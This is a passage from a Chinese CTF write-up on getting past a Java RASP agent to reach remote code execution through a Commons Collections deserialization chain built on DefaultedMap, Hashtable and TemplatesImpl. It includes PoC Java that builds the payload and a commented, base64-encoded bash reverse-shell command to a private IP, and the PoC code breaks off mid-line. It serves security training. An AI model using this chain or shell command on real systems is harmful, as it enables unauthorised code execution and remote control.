---
title: 绕RASP之内存马后渗透浅析
url: https://forum.butian.net/share/4338
source: 奇安信攻防社区
date: 2025-05-17
fetch_date: 2025-10-06T22:23:16.382743
---

# 绕RASP之内存马后渗透浅析

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 绕RASP之内存马后渗透浅析

* [CTF](https://forum.butian.net/topic/52)

在RASP的防御下，如何绕过waf以达到反序列化，进而RCE呢？

题目：
===
在邑网杯线下赛有题Springboot
![](https://cdn.nlark.com/yuque/0/2025/png/45147330/1745417533460-0f5432ca-57db-4d89-b00b-4f8ff6080b8c.png "null")
附件是一个jar包还有一个rasp。
RASP
====
RASP全称是Runtime applicaion self-protection，在2014念提出的一种应用程序自我保护技术，将防护功能注入到应用程序之中，通过少量的Hook函数监测程序的运行，根据当前的上下文环境实时阻断攻击事件。
目前Java RASP主要是通过Instrumentation编写Agent的形式，在Agent的premain和agentmain中加入检测类一般继承于ClassFileTransformer，当程序运行进来的时候，通过类中的transform检测字节码文件中是否有一些敏感的类文件，比如ProcessImpl等。简单的可以理解为通过Instrumentation来对JVM进行实时监控。
Instrumentation API 提供了两个核心接口：ClassFileTransformer 和 Instrumentation。ClassFileTransformer 接口允许开发者在类加载前或类重新定义时对字节码进行转换。Instrumentation 接口则提供了启动时代理和重新定义类的能力
与传统 WAF 对比， RASP 实现更为底层，规则制定更为简单，攻击行为识别更为精准。
![](https://cdn.nlark.com/yuque/0/2025/png/45147330/1745417533536-22da8952-dfa1-4ddd-9f23-573e6100e6cb.png "null")
环境复现
====
docker
```php
docker pull openjdk:8-jdk
docker run -p 45412:8888 -it --rm openjdk:8-jdk sh
java -javaagent:./rasp/rasp.jar -jar DeSpring.jar
```
题目分析
====
![](https://cdn.nlark.com/yuque/0/2025/png/45147330/1745417533616-1bfe904d-8539-426e-8a6e-04362cc03865.png "null")
jar包反编译之后，看到在/user/info的data参数能够传入base64的恶意字节码，同时有CC的依赖
SecurityObjectInputStream类中的黑名单
![](https://cdn.nlark.com/yuque/0/2025/png/45147330/1745417533679-c637d140-6506-44ba-94b9-ed0dfcbc8b2c.png "null")
由于启动了RASP，我们还得去看看插件禁用了那些黑名单
![](https://cdn.nlark.com/yuque/0/2025/png/45147330/1745417533761-6c71b945-1730-46f3-87fd-62659b0af8c8.png "null")
链子分析：
=====
发现LazyMap和DefaultedMap都没ban，Hashtable也没有ban
于是就想到一条CC链，就是前半段是CC7后半段是CC3，因为DefaultedMap跟LazyMap相似的，却比较少人知道
这里就拿DefaultedMap这条链子来分析。
```php
Hashtable#readObject()
DefaultedMap#get()
InstantiateTransformer#transform()
newInstance()
TrAXFilter#TrAXFilter()
TemplatesImpl#newTransformer()
TemplatesImpl#getTransletInstance()
TemplatesImpl#defineTransletClasses
newInstance()
Runtime.exec()
```
首先DefaultedMap也有readObject()
![](https://cdn.nlark.com/yuque/0/2025/png/45147330/1745417533817-36db84e3-5bc4-4856-9807-60846054c0d5.png "null")
反序列化触发Hashtable#readObject()
![](https://cdn.nlark.com/yuque/0/2025/png/45147330/1745417533907-8c575c5f-573b-403a-b416-c6bb056d9767.png "null")
这里传进去的key其实就是DefaultedMap
跟进reconstitutionPut(table, key, value)
![](https://cdn.nlark.com/yuque/0/2025/png/45147330/1745417533977-b17bd88d-e2f2-4da4-8537-49b495dd42d7.png "null")
虽然DefaultedMap没有equals方法，但他继承了AbstractMapDecorator所以，此时key如果是DefaultedMap则会调用父类AbstractMapDecorator的equals方法。
![](https://cdn.nlark.com/yuque/0/2025/png/45147330/1745417534034-d1d94f7e-9f2e-49ad-b93c-d38313d04fe6.png "null")
map属性是通过DefaultedMap传递的，我们在构造利用链的时候，通过DefaultedMap的静态方法decorate将HashMap传给了map属性，因此这里会调用HashMap的equals方法
我们在HashMap中并没有找到一个名字为equals的成员方法，但是通过分析发现HashMap继承了AbstractMap抽象类，该类中有一个equals方法
![](https://cdn.nlark.com/yuque/0/2025/png/45147330/1745417534093-ae70ae00-6e3a-40e0-8a07-6daf8524d0e4.png "null")
抽象类AbstractMap的equals方法进行了更为复杂的判断：
1、判断是否为同一对象
2、判断对象的运行类型
3、判断Map中元素的个数,一定要为两个以上
当以上三个判断都不满足的情况下，则进一步判断Map中的元素，也就是判断元素的key和value的内容是否相同，在value不为null的情况下，m会调用get方法获取key的内容，虽然对象o向上转型成Map类型，但是m对象本质上是一个DefaultedMap。因此m对象调用get方法时实际上是调用了DefaultedMap的get方法。
![](https://cdn.nlark.com/yuque/0/2025/png/45147330/1745417534145-69e2fe8c-4624-4076-a403-d06025888f10.png "null")
这里的key是传过来的key,条件是this.map没有这个key即可。
```php
HashMap hashmap=new HashMap();
hashmap.put("exp",TrAXFilter.class);
```
我们是利用这样的方式修改传进去的key
![](https://cdn.nlark.com/yuque/0/2025/png/45147330/1745417534201-e41bd8b2-5eaf-4b49-9319-c6320f2eb814.png "null")
然后就会自动步入第二个if条件。
发现这当value是transformer的实例的时候,会调用value的transform方法,来看看构造方法,这里就用一个就行了
同时这里的value是我们可控的,我们可以直接利用反射去传进一个value
```php
Field f = DefaultedMap.class.getDeclaredField("value");
```
所以找到我们能用的transformer就行
InstantiateTransformer就是transformer的实例化类并且在c3链中有,这里就再回顾一遍它的构造方法有一个是
```php
public InstantiateTransformer(Class[] paramTypes, Object[] args) {
this.iParamTypes = paramTypes;
this.iArgs = args;
}
```
这里paramTypes其实就是args的类型,而args就是paramTypes的实例,看transformer
![](https://cdn.nlark.com/yuque/0/2025/png/45147330/1745417534261-c20f53e2-7d75-4164-8369-636c625b7559.png "null")
发现就是实例化input类,这里构造器的种类和实例化参数都是我们可控的,之前c3链用到了TrAXFilter,这个类有个一个构造方法,会调用TransformerImpl的newtransformer从而加载类
最终poc：
ExpCalcTemplatesImpl.class
```php
/\*\*
\* @className ExpCalcTemplatesImpl
\* @Author shushu
\* @Data 2025/4/22
\*\*/
package Expclass;
/\*\*
\* @className TestTemplatesImpl
\* @Author shushu
\* @Data 2025/2/12
\*\*/
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
public class ExpCalcTemplatesImpl extends AbstractTranslet {
public ExpCalcTemplatesImpl() {
super();
try {
// Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMi4xMC84NjY2IDA+JjE=}|{base64,-d}|{bash,-i}");
Runtime.getRuntime().exec("calc");
}catch (Exception e){
e.printStackTrace();
}
}
public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
}
public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
}
}
```
test.class
```php
/\*\*
\* @className test
\* @Author shushu
\* @Data 2025/4/19
\*\*/
package CCtesu;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.security.exceptions.Base64DecodingException;
import com.sun.org.apache.xml.internal.security.utils.Base64;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.functors.InstantiateFactory;
import org.apache.commons.collections.map.DefaultedMap;
import javax.xml.transform.Templates;
import java.io.\*;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;
//import SpringbootMem.EvilController;
public class test {
public static void main(String[] args) throws IllegalAccessException, IOException, ClassNotFoundException, NoSuchFieldException, Base64DecodingException, NoSuchMethodException, InvocationTargetException, InstantiationException, NotFoundException, CannotCompileException {
// byte[] code = Base64.decode(makeClass("Expclass.EvilController"));
byte[] code = Base64.decode(makeClass("Expclass.ExpCalcTemplatesImpl"));
//反射设置 Field
TemplatesImpl templates = new TemplatesImpl();
setFieldValue(templates, "\_bytecodes", new byte[][]{code});
setFieldValue(templates, "\_name", "HelloTemplatesImpl");
setFieldValue(templates,"\_tfactory", new TransformerFactoryImpl());
InstantiateFactory instantiateFactory = new InstantiateFactory(TrAXFilter.class,new Class[]{Templates.class},new Object[]{templates});
FactoryTransformer factoryTransformer = ...